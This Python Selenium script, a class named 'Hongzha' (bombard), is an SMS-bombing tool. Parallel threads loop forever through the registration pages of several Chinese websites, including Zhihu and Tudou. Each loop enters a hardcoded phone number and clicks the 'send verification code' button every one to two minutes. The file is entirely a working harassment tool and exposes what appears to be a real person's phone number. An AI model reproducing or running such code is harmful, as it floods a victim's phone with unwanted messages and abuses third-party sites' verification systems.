from selenium import webdriver
import time
from threading import Thread

class Hongzha(object):
    def __init__(self):
        self.dirverPath="/Users/caozhan/project/pyProject/angry/chromedriver"
        self.phone="15735717992"
        self.num=0
    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{} 第{}次 发送成功 {}".format(self.phone,self.num,name))
    #性商网
    def xs(self,name):
        while True:
           driver= webdriver.Chrome(self.dirverPath)
           driver.get("http://www.chinasexq.com/regone.asp")
           tel=driver.find_element_by_xpath('//*[@id="cellphone"]')
           tel.send_keys(self.phone)
           time.sleep(1)
           button=driver.find_element_by_xpath('//*[@id="btnCode"]')
           self.send_yzm(button,name)
           driver.quit()
           time.sleep(120)

    #龙纹网
    def lww(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("http://login.cqlw.com:18082/register.html")
            tel=driver.find_element_by_xpath('/html/body/div/div[1]/div[2]/div[2]/div/div/div[3]/div/input')
            tel.send_keys(self.phone)
            time.sleep(1)
            button=driver.find_element_by_xpath('/html/body/div/div[1]/div[2]/div[2]/div/div/div[3]/div/div/button')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)

    #知乎网站
    def zh(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("https://www.zhihu.com/signup")
            tel = driver.find_element_by_xpath('//*[@id="root"]/div/main/div/div/div/div[2]/div[1]/div/div/form/div[1]/div[2]/div[1]/input')
            tel.send_keys(self.phone)
            time.sleep(1)
            button = driver.find_element_by_xpath('//*[@id="root"]/div/main/div/div/div/div[2]/div[1]/div/div/form/div[3]/div[1]/button')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)
    #铜道网
    def td(self,name):
        while True:
            driver = webdriver.Chrome(self.dirverPath)
            driver.get("http://www.tongdow.com/registerUI.action")
            tel = driver.find_element_by_xpath('//*[@id="captcha"]')
            tel.send_keys(self.phone)
            time.sleep(1)
            button = driver.find_element_by_xpath('//*[@id="getSmsCaptcha"]')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)
    #嘉兆网
    def jzw(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("http://www.corad.com.cn/user/Register.aspx")
            tel=driver.find_element_by_xpath('//*[@id="telphone"]')
            tel.send_keys(self.phone)
            time.sleep(1)
            button=driver.find_element_by_xpath('//*[@id="scyzm"]')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)
    #笛佛网
    def dfw(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("http://newc.wdgj.com/Account/Register")
            tel=driver.find_element_by_xpath('//*[@id="Message"]')
            tel.send_keys(self.phone)
            time.sleep(1)
            button=driver.find_element_by_xpath('//*[@id="btnvalid"]')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(90)
    #土豆网
    def tdw(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("http://www.tudou.com/")
            driver.find_element_by_xpath('//*[@id="td-hederbox"]/div[3]/div[3]/div[2]/div[1]/span[2]').click()
            driver.find_element_by_xpath('//*[@id="YT-showMobileLogin-text"]').click()
            tel=driver.find_element_by_xpath('//*[@id="YT-mobileLogin"]/div[1]/label/span[1]')
            tel.send_keys(self.phone)
            time.sleep(1)
            button=driver.find_element_by_xpath('//*[@id="YT-getMobileCode"]')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)
    #心聊网
    def xlw(self,name):
        while True:
            driver=webdriver.Chrome(self.dirverPath)
            driver.get("http://www.pomoho.com/")
            driver.find_element_by_xpath('//*[@id="appContainer"]/div/div[1]/ul[2]/li[2]/a').click()
            tel=driver.find_element_by_xpath('//*[@id="appContainer"]/div/div[5]/div[2]/input')
            tel.send_keys(self.phone)
            time.sleep(1)
            button=driver.find_element_by_xpath('//*[@id="appContainer"]/div/div[5]/div[3]/div')
            self.send_yzm(button,name)
            driver.quit()
            time.sleep(60)


if __name__ == '__main__':
     hongzha =  Hongzha()
     xs = Thread(target=hongzha.xs,args=("性商",))
     lww=Thread(target=hongzha.lww,args=("龙纹网",))
     zh=Thread(target=hongzha.zh,args=("知乎网",))
     td=Thread(target=hongzha.td,args=("铜道网",))
     dfw=Thread(target=hongzha.dfw,args=("笛佛网",))
     tdw=Thread(target=hongzha.tdw,args=("土豆网",))

     xs.start()
     lww.start()
     zh.start()
     td.start()
     dfw.start()
     tdw.start()